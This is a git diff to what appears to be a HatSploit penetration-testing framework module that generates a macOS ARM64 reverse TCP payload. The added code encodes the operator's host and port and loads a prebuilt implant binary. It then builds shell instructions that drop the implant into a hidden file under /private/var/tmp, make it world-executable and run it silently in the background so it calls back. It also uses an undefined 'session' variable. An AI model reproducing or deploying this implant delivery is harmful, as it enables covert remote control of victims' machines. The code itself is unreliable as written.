@@ -37,10 +37,29 @@ class HatSploitPayload(HatSploitPayload):
     }
 
     def generate(self):
+        local_host, local_port = self.parser.parse_options(self.options)
+
+        remote_data = base64.b64encode((local_host + ':' + local_port).encode())
+        remote_data = remote_data.decode()
+
         self.badges.output_process("Generating payload...")
 
-        binary = open('external/bin/macos_membrane_aarch64.bin', 'rb')
-        payload = binary.read()
-        binary.close()
+        try:
+            binary = open(self.config.path_config['base_paths']['data_path'] + 'payloads/macos/aarch64/membrane_reverse_tcp/bin/membrane.bin', 'rb')
+            payload = binary.read()
+            binary.close()
+        except Exception:
+            self.badges.output_error("Failed to generate payload!")
+
+        instructions = ""
+        instructions += f"cat >/private/var/tmp/.payload;"
+        instructions += f"chmod 777 /private/var/tmp/.payload;"
+        instructions += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"
+        instructions += "\n"
+
+        self.method['Payload'] = payload
+        self.method['Instructions'] = instructions
+        self.method['Session'] = session
+        self.method['Type'] = 'reverse_tcp'
 
         return payload
